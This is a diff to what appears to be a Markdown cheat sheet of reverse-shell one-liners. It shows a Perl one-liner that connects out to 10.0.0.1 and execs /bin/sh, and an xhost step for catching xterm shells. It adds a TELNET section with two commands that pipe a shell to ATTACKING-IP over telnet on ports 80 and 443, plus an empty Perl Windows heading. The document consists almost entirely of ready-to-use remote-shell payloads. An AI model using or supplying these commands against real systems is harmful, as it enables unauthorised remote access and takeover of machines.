@@ -45,6 +45,8 @@
 ## PERL Reverse Shells
 
 > - **perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'**
+>
+>> ### PERL Windows Reverse Shell
 
 ## JAVA Reverse Shells
 
@@ -65,3 +67,9 @@ To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port
 You’ll need to authorise the target to connect to you (command also run on your host):
 
 > - **xhost +targetip**
+
+## TELNET Reverse Shells
+
+> - rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
+>
+> - telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
